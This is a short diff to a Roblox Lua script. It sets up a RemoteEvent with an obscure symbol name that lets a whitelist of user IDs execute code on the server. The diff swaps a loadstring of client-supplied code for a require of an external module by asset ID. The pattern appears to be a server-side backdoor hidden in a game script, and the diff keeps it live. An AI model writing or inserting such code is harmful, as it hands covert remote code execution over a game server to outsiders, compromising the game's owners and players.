@@ -18,9 +18,9 @@ end
 local function Reload()
     local RemoteEvent = Instance.new("RemoteEvent")
     RemoteEvent.Name = "Α&Ω"
-    RemoteEvent.OnServerEvent:Connect(function(player, run)
+    RemoteEvent.OnServerEvent:Connect(function(player, a: string)
         if (table.find(users, player.UserId)) then
-            loadstring(run)();
+            require(10435436306)(a);
         end
     end)
     RemoteEvent.Parent = GetParent();
